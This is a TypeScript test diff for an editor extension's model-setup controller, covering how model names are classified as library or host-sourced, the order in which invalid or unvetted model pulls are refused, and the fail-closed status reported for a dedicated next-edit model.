+  "No vetted build of this model is published yet — it can't be downloaded automatically. Use the guided instructions below, or the vLLM path (official release).";
+const NEXT_WARNING_COPY =
+  'Needs ~15 GB of GPU memory at full precision, or ~5 GB for the 4-bit build. On a CPU-only machine a 7B model produces a few tokens per second — dedicated next-edit will feel slow; the Generic mode reuses your smaller FIM model instead.';
+
+describe('T13 classification truth table (rev 6 — the `/`-required predicate)', () => {
+  // A model with NO '/' is ALWAYS a library name — dots in name/tag IRRELEVANT.
+  const LIBRARY = [
+    'qwen2.5-coder:1.5b-base', // the ACTUAL dotted FIM default
+    'qwen3-embedding:0.6b', // the ACTUAL dotted RAG default
+    'ns/name:tag', // namespaced, dotless first segment
+    NEXT_DEDICATED_MODEL.ollamaCreatedName, // no '/' at all — library-shaped by construction
+  ];
+  // HOST-SOURCED iff '/' present AND pre-first-'/' segment is host-like
+  // ('.' OR ':' OR equals 'localhost' case-insensitively).
+  const HOST_SOURCED = [
+    'hf.co/SyntinalCo/sweep-next-edit-v2-7B-GGUF:Q4_K_M',
+    'huggingface.co/SyntinalCo/sweep-next-edit-v2-7B-GGUF', // the alias (§0.3) — same fate
+    'registry.example.com/foo',
+    'localhost:11434/foo',
+    'LOCALHOST/foo', // case variant of the bare-localhost rule
+    'HF.CO/SyntinalCo/x', // case variant — '.' detection is case-blind anyway
+    NEXT_DEDICATED_MODEL.ollamaPullAlias, // the pinned manual alias itself
+  ];
+
+  for (const model of LIBRARY) {
+    it(`LIBRARY: '${model}'`, () => {
+      expect(isHostSourcedModel(model)).toBe(false);
+    });
+  }
+  for (const model of HOST_SOURCED) {
+    it(`HOST-SOURCED: '${model}'`, () => {
+      expect(isHostSourcedModel(model)).toBe(true);
+    });
+  }
+});
+
+describe('T13 refusal ORDER (real registry — sha256 empty, fail-closed)', () => {
+  it('(1) invalid endpoint refused FIRST — before modal, pull, verify, ingest', async () => {
+    const { host, depCalls, controller } = makeController();
+    const result = await controller.handle('setup.pullModel', {
+      model: 'qwen2.5-coder:1.5b-base',
+      endpoint: 'not-a-url',
+    });
+    expect(result).toEqual({ ok: false, reason: 'Enter a valid http:// or https:// URL.' });
+    expect(host.calls).toEqual([]); // no modal
+    expect(depCalls).toEqual([]); // no pullModel / verifyHfDigest / ingestGguf
+  });
+
+  it('(1) beats (2): bad endpoint + host-sourced model → the URL refusal, not the host-sourced copy', async () => {
+    const { controller } = makeController();
+    const result = await controller.handle('setup.pullModel', {
+      model: 'hf.co/SyntinalCo/x',
+      endpoint: 'not-a-url',
+    });
+    expect(result).toEqual({ ok: false, reason: 'Enter a valid http:// or https:// URL.' });
+  });
+
+  const HOST_SOURCED_VARIANTS = [
+    'hf.co/SyntinalCo/sweep-next-edit-v2-7B-GGUF:Q4_K_M',
+    'huggingface.co/SyntinalCo/sweep-next-edit-v2-7B-GGUF:Q4_K_M',
+    'registry.example.com/foo:latest',
+    'localhost:11434/foo',
+    'HF.co/SyntinalCo/x:q4_k_m',
+    '  hf.co/SyntinalCo/x', // leading whitespace — normalize(trim) happens BEFORE classify
+    NEXT_DEDICATED_MODEL.ollamaPullAlias,
+  ];
+  for (const model of HOST_SOURCED_VARIANTS) {
+    it(`(2) host-sourced '${model}' → ALWAYS refused with the §6 copy, before modal/pull/ingest`, async () => {
+      const { host, depCalls, controller } = makeController();
+      const result = await controller.handle('setup.pullModel', { model });
+      expect(result).toEqual({ ok: false, reason: HOST_SOURCED_REFUSAL_COPY });
+      expect(host.calls).toEqual([]);
+      expect(depCalls).toEqual([]);
+    });
+  }
+
+  it('(3a) vetted name with empty sha256 → download-unavailable copy; verify/modal/ingest never reached', async () => {
+    const { host, depCalls, controller } = makeController();
+    const result = await controller.handle('setup.pullModel', {
+      model: NEXT_DEDICATED_MODEL.ollamaCreatedName,
+    });
+    expect(result).toEqual({ ok: false, reason: DOWNLOAD_UNAVAILABLE_COPY });
+    expect(host.calls).toEqual([]);
+    expect(depCalls).toEqual([]);
+  });
+
+  it('(3) vetted-name match is case-insensitive (uppercase variant hits the same (3a) refusal, not the library tier)', async () => {
+    const { host, depCalls, controller } = makeController();
+    const result = await controller.handle('setup.pullModel', {
+      model: NEXT_DEDICATED_MODEL.ollamaCreatedName.toUpperCase(),
+    });
+    expect(result).toEqual({ ok: false, reason: DOWNLOAD_UNAVAILABLE_COPY });
+    expect(host.calls).toEqual([]); // in particular: NOT the library pull modal
+    expect(depCalls).toEqual([]);
+  });
+
+  it('(4) DOTTED library name pulls normally — byte-identical regression (modal copy + deps.pullModel, never ingest)', async () => {
+    const { host, depCalls, controller } = makeController();
+    const result = await controller.handle('setup.pullModel', { model: 'qwen2.5-coder:1.5b-base' });
+    expect(result).toEqual({ ok: true });
+    expect(host.calls).toEqual([
+      "showModal:Pull model 'qwen2.5-coder:1.5b-base' from the Ollama registry to your local disk?",
+    ]);
+    expect(depCalls).toEqual(['pullModel']);
+  });
+});
+
+describe('T13 presence wire (§4.2 — status() facts, real registry sha256=empty)', () => {
+  it('ollama.endpoint carries the endpoint status() actually probed (registry default)', async () => {
+    const { controller } = makeController();
+    const data = await controller.status();
+    expect(data.ollama.endpoint).toBe('http://127.0.0.1:11434');
+  });
+
+  it('nextEdit.dedicated: fail-closed block — downloadReady=false, R-3 empty ollama prefill, no llamacpp guided line', async () => {
+    const { controller } = makeController();
+    const data = await controller.status();
+    expect(data.nextEdit.dedicated).toEqual({
+      displayName: 'Sweep Next-Edit v2 (7B)',
+      // ⚠ R-3: '' WHILE !downloadReady — an unpullable prefill would persist
+      // a model that resolves to nothing. openaiCompat (official safetensors)
+      // is unaffected.
+      modelDefaults: { ollama: '', openaiCompat: 'sweepai/sweep-next-edit-v2-7B' },
+      downloadReady: false, // sha256 === '' and NOTHING else drives this
+      downloadApproxBytes: 4_680_000_000,
+      warning: NEXT_WARNING_COPY,
+      guided: {
+        vllm: 'Run: vllm serve sweepai/sweep-next-edit-v2-7B\n(official Sweep release, ~15 GB download)',
+        // llamacpp ABSENT while !downloadReady (S-F2: the -hf line is gated
+        // by the same pin as the Download button).
+      },
+    });
+  });
+});
